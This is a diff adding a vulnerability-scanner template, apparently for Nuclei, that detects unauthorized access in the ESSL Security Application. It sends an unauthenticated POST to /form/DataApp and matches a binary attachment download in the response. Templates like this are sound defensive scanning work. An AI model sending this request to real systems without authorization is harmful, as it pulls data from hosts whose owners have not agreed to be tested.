@@ -1,0 +1,32 @@
+id: esslsecurity-unauthorized-access
+info:
+  name: Unauthorized Access in ESSL Security Application
+  author: ProjectDiscoveryAI
+  severity: critical
+  reference:
+    - https://nosec.org/home/detail/3032.html
+http:
+  - raw:
+      - |
+        POST /form/DataApp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        style=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "Content-Disposition: attachment"
+      - type: word
+        part: header
+        words:
+          - "application/binary"
+      - type: word
+        part: body
+        words:
+          - "ZK"
